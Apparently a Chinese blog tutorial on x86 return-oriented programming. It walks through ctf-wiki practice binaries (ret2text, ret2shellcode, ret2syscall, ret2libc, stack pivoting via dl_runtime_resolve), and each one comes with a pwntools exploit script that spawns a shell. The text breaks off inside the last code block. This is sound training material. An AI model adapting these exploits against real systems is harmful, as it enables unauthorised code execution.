{"title":"ROP-x86","uid":"a1737faa9c5d2f3d8075974e9ccad146","slug":"ROP-x86","date":"2021-10-05T10:23:30.000Z","updated":"2021-11-06T02:16:43.925Z","comments":true,"path":"api/articles/ROP-x86.json","keywords":null,"cover":"https://i.loli.net/2021/06/06/3ZBmwPkcIXjUE17.jpg","content":"<h1 id=\"ROP原理\"><a href=\"#ROP原理\" class=\"headerlink\" title=\"ROP原理\"></a>ROP原理</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>\n<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>\n<ul>\n<li>程序存在溢出，并且可以控制返回地址。</li>\n<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>\n</ul>\n<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>\n<h1 id=\"ret2text\"><a href=\"#ret2text\" class=\"headerlink\" title=\"ret2text\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text\">ret2text</a></h1><h2 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>控制程序执行程序本身已有的的代码 (.text)</p>\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>首先查看附件，32位可执行文件且只开了NX保护</p>\n<p><img src=\"https://i.loli.net/2021/06/06/TX1cHdubI45RlPp.png\" alt=\"image.png\"></p>\n<p>利用IDA查看伪代码，可以看到，主函数存在栈溢出漏洞<img src=\"https://i.loli.net/2021/06/06/i4CJDosGfOb1TEQ.png\" alt=\"image.png\"></p>\n<p>不仅如此，在secure函数中发现了系统调用，其地址为0x0804863A，所以我们可以利用secure函数的代码来获取系统的shell<img src=\"https://i.loli.net/2021/06/06/Wsz8ARtm6n4LYIa.png\" alt=\"image.png\"></p>\n<p>接下来就是计算s的偏移量。设置断点0x08048641，进行调试</p>\n<p>可以看到，esp指向地址为0xffffcf70，ebp指向地址为0xffffcff8，因为s的地址为esp+0x1c，所以s相当于ebp的偏移量为：0xffffcff8-0xffffcf70-0x1c=0x6c，s相当于返回地址的偏移量为： 0x6c+4<img src=\"https://i.loli.net/2021/06/06/KFQVS5bCJfePYTs.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2text&#x27;</span>)</span><br><span class=\"line\">target = <span class=\"number\">0x804863a</span></span><br><span class=\"line\">sh.sendline(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">0x6c</span>+<span class=\"number\">4</span>) + p32(target))</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>通过栈溢出直接跳转到对应的后门函数，从而获取shell，堆栈图如下：</p>\n<p><img src=\"https://i.loli.net/2021/10/16/Iun5QrlVOhaJwRK.png\" alt=\"image.png\"></p>\n<h1 id=\"ret2shellcode\"><a href=\"#ret2shellcode\" class=\"headerlink\" title=\"ret2shellcode\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode\">ret2shellcode</a></h1><h2 id=\"方法-1\"><a href=\"#方法-1\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>程序执行我们自己填充的shellcode代码</p>\n<h2 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>按照ret2text思路，发现存在栈溢出，计算出s相对于返回地址的偏移量为112。查看字符串，并没有发现system函数，但是我们发现我们输入的字符串会复制到buf2，所以我们可以利用buf2构造shellcode代码，<img src=\"https://i.loli.net/2021/06/06/QbU3YlyvFrws2V8.png\" alt=\"image.png\"><img src=\"https://i.loli.net/2021/06/06/3lnkurmIjBxszJG.png\" alt=\"image.png\"></p>\n<p>先判断一下buf2所在地址是否可执行。利用IDA查看buf2的地址<img src=\"https://i.loli.net/2021/06/06/aVwCQ9mclOuWKdY.png\" alt=\"image.png\"></p>\n<p>在查看一下这个地址是否可执行。发现这个地址可读可写可执行。<img src=\"https://i.loli.net/2021/06/06/xFsyLRJPEoZ4YfS.png\" alt=\"image.png\"></p>\n<p>之后构建payload</p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">buf2 = <span class=\"number\">0x804A080</span></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">payload = shellcode.ljust(<span class=\"number\">112</span>, <span class=\"string\">&#x27;a&#x27;</span>) + p32(buf2)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;解释一下&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;shellcraft.sh作用是生成好system(&quot;bin/sh&quot;)的代码&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;asm函数是将代码转成机器指令&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;ljust函数作用就是向右对其并用给定字符补充字符串&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>通过栈溢出跳转到我们写好shellcode的区域，让程序执行shellcode从而获取shell</p>\n<p><img src=\"https://i.loli.net/2021/10/16/gKpoSxOZ6EDCtrN.png\" alt=\"image.png\"></p>\n<h1 id=\"ret2syscall\"><a href=\"#ret2syscall\" class=\"headerlink\" title=\"ret2syscall\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text\">ret2syscall</a></h1><h2 id=\"方法-2\"><a href=\"#方法-2\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>控制程序执行系统调用，获取 shell。</p>\n<h2 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>先查看附件</p>\n<p><img src=\"https://i.loli.net/2021/06/06/E548xu9R7JOXjph.png\" alt=\"image.png\"></p>\n<p>接下来利用 IDA 来查看源码，并没有system函数，而且也没有bin/sh字符<img src=\"https://i.loli.net/2021/06/06/Ih4PmFtxo63OgBn.png\" alt=\"image.png\"></p>\n<p>可以看到，函数存在栈溢出，接下来就是计算v4的偏移量。先设置断点，将断点设置在调用gets函数那里<img src=\"https://i.loli.net/2021/06/06/mgMuoesVOpEzWXQ.png\" alt=\"image.png\"></p>\n<p>接下来就是调试。可以看到esp指向地址0xffffcf80，v4的地址为esp+1c，ebp指向的地址0xffffd008，由此可以计算出v4的偏移量为0xffffd008-0xffffcf80-0x1c=108，所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。<img src=\"https://i.loli.net/2021/06/06/qzpYFsk2cQNmg14.png\" alt=\"image.png\"></p>\n<p>此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。（<a href=\"https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8\">系统调用基本知识</a>）我们可以通过执行 int 0x80 来执行对应的系统调用。对于这道题，我们可以使用这个系统调用**execve(“/bin/sh”,NULL,NULL)**，其中，该程序是 32 位，这个系统调用需要满足的条件：</p>\n<ul>\n<li>系统调用号，即 eax 应该为 0xb（是指系统调用编号）</li>\n<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>\n<li>第二个参数，即 ecx 应该为 0</li>\n<li>第三个参数，即 edx 应该为 0</li>\n</ul>\n<p>64位shellcode的参数和execve调用应为：</p>\n<ul>\n<li>rax = 0x3b</li>\n<li>rdi指向”/bin/sh”</li>\n<li>rsi = 0x0</li>\n<li>rdx = 0x0</li>\n<li>execve(“/bin/sh”, 0, 0);</li>\n</ul>\n<p>为满足这些条件，我们可以使用 gadgets来完成。如利用堆栈对寄存器赋值，先将10存入栈中，再pop eax。所以，接下来就是寻找符合条件的gadgets。（<a href=\"https://www.wangan.com/docs/678\">ROPgadget安装与使用方法</a>）<img src=\"https://i.loli.net/2021/06/06/lExnp75bSDTwsyi.png\" alt=\"image.png\"></p>\n<p>接下来就是组装：**payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])**，其中 0xb 为 execve 对应的系统调用号。</p>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./rop&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_eax_ret = <span class=\"number\">0x080bb196</span></span><br><span class=\"line\">pop_edx_ecx_ebx_ret = <span class=\"number\">0x0806eb90</span></span><br><span class=\"line\">int_0x80 = <span class=\"number\">0x08049421</span></span><br><span class=\"line\">bin_sh = <span class=\"number\">0x80be408</span></span><br><span class=\"line\">payload =<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>+p32(pop_eax_ret)+ p32(<span class=\"number\">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class=\"number\">0</span>)+p32(<span class=\"number\">0</span>)+p32(bin_sh)+p32(int_0x80)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/10/16/3Jz9KSrEgZDPcYW.png\" alt=\"image.png\"></p>\n<h1 id=\"ret2libc1\"><a href=\"#ret2libc1\" class=\"headerlink\" title=\"ret2libc1\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1\">ret2libc1</a></h1><h2 id=\"方法-3\"><a href=\"#方法-3\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>利用gadgets构建ROP获取shell</p>\n<h2 id=\"思路-3\"><a href=\"#思路-3\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>check一下32位程序，且只开了NX保护</p>\n<p><img src=\"https://i.loli.net/2021/07/12/T7UivSYopaZFkxK.png\" alt=\"image.png\"></p>\n<p>丢进IDA，查看伪代码，存在gets函数，很明显存在栈溢出<img src=\"https://i.loli.net/2021/07/12/Z6y1jb4Rx7zoien.png\" alt=\"image.png\"></p>\n<p>查看函数列表以及字符串列表，很明显可以构建ROP<img src=\"https://i.loli.net/2021/07/12/R49gkfUZyHouv3e.png\" alt=\"屏幕截图 2021-07-12 101906.png\"></p>\n<p>最后就是计算偏移量。s的偏移量0xffffcfb8-ffffcf4c=6c，相对于返回地址的偏移量6c+4<img src=\"https://i.loli.net/2021/07/12/j4w8hMAQ1ntcyfp.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP-3\"><a href=\"#EXP-3\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./ret2libc1&quot;</span>)</span><br><span class=\"line\">sys_addr = <span class=\"number\">0x8048460</span></span><br><span class=\"line\">bin_sh = <span class=\"number\">0x08048720</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">112</span>+p32(sys_addr)+‘a<span class=\"string\">&#x27;*4+p32(bin_sh)</span></span><br><span class=\"line\"><span class=\"string\">p.sendline(payload)</span></span><br><span class=\"line\"><span class=\"string\">p.interactive()</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;因为调用system函数中途需要一个返回地址，而直接利用system gadget会导致缺失返回地址，所以需要一个虚拟地址p32(0x11111111)平衡堆栈&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/10/16/K6agdE8mjHhtR1M.png\" alt=\"image.png\"></p>\n<h1 id=\"ret2libc2\"><a href=\"#ret2libc2\" class=\"headerlink\" title=\"ret2libc2\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2\">ret2libc2</a></h1><p>ida查看，可以看到这里有system函数，但是没有bin/sh，但是这里有gets函数，我们可以利用gets函数传入bin/sh字符，从而利用system获取shell</p>\n<p><img src=\"https://i.loli.net/2021/08/30/lJf9ZiPbnCsWDQq.png\" alt=\"屏幕截图 2021-08-30 093824.png\"></p>\n<p><img src=\"https://i.loli.net/2021/08/30/n2o6rlDEY1vsKhH.png\" alt=\"image.png\"></p>\n<p>计算好偏移，将通过gets获取的字符存入到bss段可写区域</p>\n<p><img src=\"https://i.loli.net/2021/08/30/XRCi8KrmfosnlcY.png\" alt=\"屏幕截图 2021-08-30 105444.png\"></p>\n<h2 id=\"EXP-4\"><a href=\"#EXP-4\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\">sys_addr = <span class=\"number\">0x08048490</span></span><br><span class=\"line\">bss = <span class=\"number\">0x804a000</span></span><br><span class=\"line\">gets_addr = <span class=\"number\">0x8048460</span></span><br><span class=\"line\">pop_ebx = <span class=\"number\">0x0804843d</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x70</span>+p32(gets_addr)+p32(sys_addr)+p32(bss)+p32(bss)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>栈示意图如下：</p>\n<p><img src=\"https://i.loli.net/2021/10/15/1oSdCuYms2y97iI.png\" alt=\"image.png\"></p>\n<h1 id=\"ret2libc3\"><a href=\"#ret2libc3\" class=\"headerlink\" title=\"ret2libc3\"></a>ret2libc3</h1><h2 id=\"思路-4\"><a href=\"#思路-4\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>这次的题目没有system函数，也没有bin/sh字符串，也不像ret2shellcode可以跳转执行shellcode，因此，只能换过一种思路。在libc.so 动态链接库中函数的偏移是固定的，所以我们可以通过泄露某个函数的偏移来确定程序使用的libc版本，从而获取system函数的的地址。我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong>（所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序）具体操作如下：</p>\n<ul>\n<li><p>泄露 __libc_start_main 地址</p>\n</li>\n<li><p>获取 libc 版本</p>\n</li>\n<li><p>获取 system 地址与 /bin/sh 的地址</p>\n</li>\n<li><p>再次执行源程序</p>\n</li>\n<li><p>触发栈溢出执行 system(‘/bin/sh’)</p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"https://i.loli.net/2021/10/16/zTAHIWrEq6UB3Lf.png\" alt=\"屏幕截图 2021-10-16 145422.png\"></p>\n<h2 id=\"EXP-5\"><a href=\"#EXP-5\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2libc3&#x27;</span>)</span><br><span class=\"line\">ret2libc3 = ELF(<span class=\"string\">&#x27;./ret2libc3&#x27;</span>)</span><br><span class=\"line\">puts_plt = ret2libc3.plt[<span class=\"string\">&#x27;puts&#x27;</span>]        <span class=\"comment\"># 获取程序中puts函数的plt地址</span></span><br><span class=\"line\">libc_puts_got = ret2libc3.got[<span class=\"string\">&#x27;puts&#x27;</span>]          <span class=\"comment\"># 获取程序中puts函数的got</span></span><br><span class=\"line\">start_addr = ret2libc3.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]        <span class=\"comment\"># 获取程序中_start函数的地址</span></span><br><span class=\"line\">payload1 = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>, puts_plt,start_addr , libc_puts_got])        <span class=\"comment\"># 通过栈溢出让程序跳转到puts函数泄露出libc_puts_got地址再返回到start函数重新执行</span></span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;Can you find it !?&#x27;</span>, payload1)</span><br><span class=\"line\">libc_puts_addr = u32(sh.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])         <span class=\"comment\"># 接收puts函数的地址</span></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, libc_puts_addr)       <span class=\"comment\"># 确定程序使用的libc</span></span><br><span class=\"line\">libcbase = libc_puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)       <span class=\"comment\"># 计算基地址</span></span><br><span class=\"line\">system_addr = libcbase + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)         <span class=\"comment\"># 计算出system函数以及bin/sh字符串的地址</span></span><br><span class=\"line\">binsh_addr = libcbase + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload2 = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>, system_addr, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">4</span>, binsh_addr])</span><br><span class=\"line\">sh.sendline(payload2)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p><img src=\"https://i.loli.net/2021/10/16/ZDnvcXt1YoPOlSV.png\" alt=\"image.png\"></p>\n<p>参考文章：<a href=\"https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall\">https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall</a></p>\n<h1 id=\"NO-RELRO\"><a href=\"#NO-RELRO\" class=\"headerlink\" title=\"NO RELRO\"></a>NO RELRO</h1><p>介绍这道题前先补充一些知识点：</p>\n<h2 id=\"dl-runtime-resolve-函数\"><a href=\"#dl-runtime-resolve-函数\" class=\"headerlink\" title=\"dl_runtime_resolve 函数\"></a>dl_runtime_resolve 函数</h2><p>在延迟绑定中说到dl_runtime_resolve 函数，只是说了这个函数会寻找程序第一次执行的函数但是并没有说原理，这次来补充一下。</p>\n<ol>\n<li><p>dl_runtime_resolve 需要两个参数，一个是 reloc_arg，就是函数自己的 plt 表项 push 的内容，一个是link_map，这个是公共 plt 表项 push 进栈的，通过它可以找到.dynamic的地址</p>\n</li>\n<li><p>而 .dynamic 可以找到 .dynstr、.dynsym、.rel.plt 的这些东西的地址</p>\n<ul>\n<li>.dynstr 的地址是 .dynamic + 0x44 -&gt; 0x08048278</li>\n<li>.dynsym 的地址是 .dynamic + 0x4c -&gt; 0x080481d8</li>\n</ul>\n<ul>\n<li>.rel.plt 的地址是 .dynamic + 0x84 -&gt; 0x08048330</li>\n</ul>\n</li>\n<li><p>.rel.plt 的地址加上 reloc_arg 可以得到函数重定位表项 Elf32_Rel 的指针，这个指针对应的里面放着 r_offset、r_info</p>\n</li>\n<li><p>将 r_info&gt;&gt;8 得到的就是 .dynsym 的下标，这个下标的内容就是 name_offset</p>\n</li>\n<li><p>.dynstr+name_offset 得到的就是 st_name，而 st_name 存放的就是要调用函数的函数名</p>\n</li>\n<li><p>在动态链接库里面找这个函数的地址，赋值给 *rel-&gt;r_offset，也就是 GOT 表就完成了一次函数的动态链接</p>\n</li>\n</ol>\n<p><img src=\"https://i.loli.net/2021/10/21/BjXtb1uwMRVeDng.png\" alt=\"image.png\"></p>\n<h2 id=\"栈迁移\"><a href=\"#栈迁移\" class=\"headerlink\" title=\"栈迁移\"></a>栈迁移</h2><p>栈迁移作用是让程序跳转到我们构造好的栈中从而让程序按照我们的思路走下去。</p>\n<ul>\n<li>先用无用字符填满到rbp</li>\n<li>在将rbp跳转到我们想构造的栈帧位置</li>\n<li>再通过read向我们想构造的栈中写入数据</li>\n<li>最后通过leave_ret将esp指向栈帧，ebp指向栈底位置</li>\n</ul>\n<p><img src=\"https://i.loli.net/2021/10/20/yHcJdKsqGZ5zCeP.png\" alt=\"image.png\"></p>\n<p>因为步骤有点多，所以就边写边改。</p>\n<h2 id=\"stage1\"><a href=\"#stage1\" class=\"headerlink\" title=\"stage1\"></a>stage1</h2><p>先将栈迁移到我们想构造的地方并在该地方写入我们想要写的数据</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">write_plt = elf.plt[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">ppp_ret = <span class=\"number\">0x08048619</span> <span class=\"comment\"># ROPgadget --binary main--only &quot;pop|ret&quot;，作用是将read的参数弹出恢复堆栈</span></span><br><span class=\"line\">pop_ebp_ret = <span class=\"number\">0x0804861b</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x08048458</span> <span class=\"comment\"># ROPgadget --binary main --only &quot;leave|ret&quot;</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x0804a040</span> <span class=\"comment\"># readelf -S main | grep &quot;.bss&quot;</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># payload1</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;A&#x27;</span> * offset</span><br><span class=\"line\">payload += p32(read_plt) <span class=\"comment\"># 读100个字节到base_stage</span></span><br><span class=\"line\">payload += p32(ppp_ret)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p32(base_stage)</span><br><span class=\"line\">payload += p32(<span class=\"number\">100</span>)</span><br><span class=\"line\">payload += p32(pop_ebp_ret) <span class=\"comment\"># 把base_stage pop到ebp中</span></span><br><span class=\"line\">payload += p32(base_stage)</span><br><span class=\"line\">payload += p32(leave_ret) <span class=\"comment\"># mov esp, ebp ; pop ebp ;将esp指向base_stage</span></span><br><span class=\"line\">r.sendline(payload1)</span><br><span class=\"line\"><span class=\"comment\"># payload2</span></span><br><span class=\"line\">cmd = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;AAAA&#x27;</span> <span class=\"comment\"># 因为前面leave_ret以后esp会指向base_stage下一地址，所以这里用无用字符填充</span></span><br><span class=\"line\">payload2 += p32(write_plt)</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;AAAA&#x27;</span></span><br><span class=\"line\">payload2 += p32(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload2 += p32(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">payload2 += p32(<span class=\"built_in\">len</span>(cmd))</span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">payload2 += cmd + <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">payload2 += <span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(payload2))</span><br><span class=\"line\">r.sendline(payload2)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>payload里面的p32(read_plt)+p32(ppp_ret)+p32(0) +p32(base_stage) +p32(100)构造函数read(0,base_stage,100)作用是向我们伪造数据段的地方写入数据，也就是后面的payload2<img src=\"https://i.loli.net/2021/10/20/CfVrNBOS4u5PbdT.png\" alt=\"image.png\"></p>\n<h2 id=\"stage2\"><a href=\"#stage2\" class=\"headerlink\" title=\"stage2\"></a>stage2</h2><p>接下来，用 dlresolve 的知识来调用 write 函数，利用 plt[0] 的相关指令，即公共 plt 表项 push linkmap 以及跳转到 dl_resolve 函数中解析的指令。此外，我们还得单独提供一个 write 重定位项在 plt 表中的偏移，即 write@plt push的那个参数。整个过程相当于调用dl_runtime_resolve 函数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 